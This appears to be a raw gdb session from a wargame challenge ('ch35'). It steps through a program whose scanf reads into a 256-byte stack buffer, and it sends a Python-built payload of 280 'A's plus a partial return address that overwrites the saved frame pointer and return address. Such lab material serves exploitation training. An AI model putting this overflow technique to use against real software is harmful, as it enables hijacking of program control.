   0x34e6b044f53 <__libc_start_main+259>:	mov    rax,QWORD PTR [rip+0x3a20f6]        # 0x34e6b3e7050 <__libc_pthread_functions+400>
   0x34e6b044f5a <__libc_start_main+266>:	ror    rax,0x11
   0x34e6b044f5e <__libc_start_main+270>:	xor    rax,QWORD PTR fs:0x30
   0x34e6b044f67 <__libc_start_main+279>:	call   rax
-----------------------------------------------------------------------------------------------------------------------------
__libc_start_main (main=0x4006fc <main>, argc=0x1, argv=0x3dbe1708d28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x3dbe1708d18) at libc-start.c:321
321	libc-start.c: No such file or directory.
gdb$ i r
rax            0x0	0x0
rbx            0x0	0x0
rcx            0x10e	0x10e
rdx            0x34e6b3e39e0	0x34e6b3e39e0
rsi            0x7ffffef1	0x7ffffef1
rdi            0x1	0x1
rbp            0x0	0x0
rsp            0x3dbe1708c50	0x3dbe1708c50
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x34e6b3e06a0	0x34e6b3e06a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3dbe1708d20	0x3dbe1708d20
r14            0x0	0x0
r15            0x0	0x0
rip            0x34e6b044f45	0x34e6b044f45 <__libc_start_main+245>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3dbe1708c50:	0x000003dbe1708d28	0x000003dbe1708d28
0x3dbe1708c60:	0x0000000100000001	0x00000000004006fc
0x3dbe1708c70:	0x0000000000000000	0xefcd6ba4e691d31b
0x3dbe1708c80:	0x00000000004005e0	0x000003dbe1708d20
0x3dbe1708c90:	0x0000000000000000	0x0000000000000000
0x3dbe1708ca0:	0xe87aa945fe31d31b	0xe951bdac7b6bd31b
0x3dbe1708cb0:	0x0000000000000000	0x0000000000000000
0x3dbe1708cc0:	0x0000000000000000	0x000003dbe1708d38
0x3dbe1708cd0:	0x0000034e6b60c1c8	0x0000034e6b3f81f3
0x3dbe1708ce0:	0x0000000000000000	0x0000000000000000
0x3dbe1708cf0:	0x00000000004005e0	0x000003dbe1708d20
gdb$ shell python -c 'print "A"*(256+24) + "\xcd\x06\x40"' > /tmp/py
gdb$ r < /tmp/py
Starting program: /challenge/app-systeme/ch35/ch35 < /tmp/py
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F3080  o d I t s Z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DEFD9F3168  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x0000000000400700
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400700 <main+4>:	sub    rsp,0x120
   0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
-----------------------------------------------------------------------------------------------------------------------------

Breakpoint 1, 0x0000000000400700 in main ()
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DEFD9F3168  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x0000000000400707
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400707 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DEFD9F3168  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x000000000040070D
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040070d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DEFD9F3168  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x0000000000400714
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400714 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DEFD9F3168  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x000000000040071B
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071b in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DEFD9F2F70  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x000000000040071E
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x00000000004007EE  RSI: 0x000003DEFD9F2F70  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x0000000000400723
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400723 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x00000000004007EE  RSI: 0x000003DEFD9F2F70  RDX: 0x000003DEFD9F3178  RCX: 0x0000000000000000  RIP: 0x0000000000400728
  R8 : 0x0000033544096E80  R9 : 0x00000335440AC530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400728 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000033544096640  RSI: 0x00000335440979F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x000000000040072D
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040072d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x0000033544096640  RSI: 0x00000335440979F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400734
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400734 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x000003DEFD9F2F70  RSI: 0x00000335440979F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400737
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400737 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000000000011B  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x000003DEFD9F2F70  RSI: 0x000000000000C800  RDX: 0x000000000000000B  RCX: 0x00FFF8EE00000000  RIP: 0x000000000040073C
  R8 : 0x000000000000F8EE  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073c in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000000000011B  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x000003DEFD9F2F70  RSI: 0x000000000000C800  RDX: 0x000000000000000B  RCX: 0x00FFF8EE00000000  RIP: 0x000000000040073F
  R8 : 0x000000000000F8EE  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073f in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x000003DEFD9F2F70  RSI: 0x000000000000C800  RDX: 0x000000000000000B  RCX: 0x00FFF8EE00000000  RIP: 0x0000000000400746
  R8 : 0x000000000000F8EE  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400746 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x000003DEFD9F2F70  RSI: 0x000003DEFD9F2F70  RDX: 0x000000000000000B  RCX: 0x00FFF8EE00000000  RIP: 0x0000000000400749
  R8 : 0x000000000000F8EE  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400749 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000003DEFD9F2F70  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x00000000004007F1  RSI: 0x000003DEFD9F2F70  RDX: 0x000000000000000B  RCX: 0x00FFF8EE00000000  RIP: 0x000000000040074E
  R8 : 0x000000000000F8EE  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040074e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a P c 
  RDI: 0x00000000004007F1  RSI: 0x000003DEFD9F2F70  RDX: 0x000000000000000B  RCX: 0x00FFF8EE00000000  RIP: 0x0000000000400753
  R8 : 0x000000000000F8EE  R9 : 0x0000000000000000  R10: 0x000003DEFD9F308B  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400753 in main ()
gdb$ i r
rax            0x0	0x0
rbx            0x0	0x0
rcx            0xfff8ee00000000	0xfff8ee00000000
rdx            0xb	0xb
rsi            0x3defd9f2f70	0x3defd9f2f70
rdi            0x4007f1	0x4007f1
rbp            0x3defd9f3080	0x3defd9f3080
rsp            0x3defd9f2f60	0x3defd9f2f60
r8             0xf8ee	0xf8ee
r9             0x0	0x0
r10            0x3defd9f308b	0x3defd9f308b
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3defd9f3160	0x3defd9f3160
r14            0x0	0x0
r15            0x0	0x0
rip            0x400753	0x400753 <main+87>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3defd9f2f60:	0x000003defd9f3168	0x0000000100000000
0x3defd9f2f70:	0x4141414141414141	0x4141414141414141
0x3defd9f2f80:	0x4141414141414141	0x4141414141414141
0x3defd9f2f90:	0x4141414141414141	0x4141414141414141
0x3defd9f2fa0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fb0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fc0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fd0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fe0:	0x4141414141414141	0x4141414141414141
0x3defd9f2ff0:	0x4141414141414141	0x4141414141414141
0x3defd9f3000:	0x4141414141414141	0x4141414141414141
gdb$ 
0x3defd9f3010:	0x4141414141414141	0x4141414141414141
0x3defd9f3020:	0x4141414141414141	0x4141414141414141
0x3defd9f3030:	0x4141414141414141	0x4141414141414141
0x3defd9f3040:	0x4141414141414141	0x4141414141414141
0x3defd9f3050:	0x4141414141414141	0x4141414141414141
0x3defd9f3060:	0x4141414141414141	0x4141414141414141
0x3defd9f3070:	0x4141414141414141	0x0000011b41414141
0x3defd9f3080:	0x4141414141414141	0x00000335004006cd
0x3defd9f3090:	0x000003defd9f3168	0x000003defd9f3168
0x3defd9f30a0:	0x0000000100000001	0x00000000004006fc
0x3defd9f30b0:	0x0000000000000000	0x1ecb5458d7ce5d47
gdb$ ni
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000115  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x00000335440979E0  RCX: 0x0000000000000114  RIP: 0x0000000000400758
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x00000335440946A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400758 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x000003DEFD9F3080  RSP: 0x000003DEFD9F2F60  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x00000335440979E0  RCX: 0x0000000000000114  RIP: 0x000000000040075D
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x00000335440946A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075d in main ()
gdb$ i r
rax            0x0	0x0
rbx            0x0	0x0
rcx            0x114	0x114
rdx            0x335440979e0	0x335440979e0
rsi            0x7ffffeeb	0x7ffffeeb
rdi            0x1	0x1
rbp            0x3defd9f3080	0x3defd9f3080
rsp            0x3defd9f2f60	0x3defd9f2f60
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x335440946a0	0x335440946a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3defd9f3160	0x3defd9f3160
r14            0x0	0x0
r15            0x0	0x0
rip            0x40075d	0x40075d <main+97>
eflags         0x202	[ IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3defd9f2f60:	0x000003defd9f3168	0x0000000100000000
0x3defd9f2f70:	0x4141414141414141	0x4141414141414141
0x3defd9f2f80:	0x4141414141414141	0x4141414141414141
0x3defd9f2f90:	0x4141414141414141	0x4141414141414141
0x3defd9f2fa0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fb0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fc0:	0x4141414141414141	0x4141414141414141
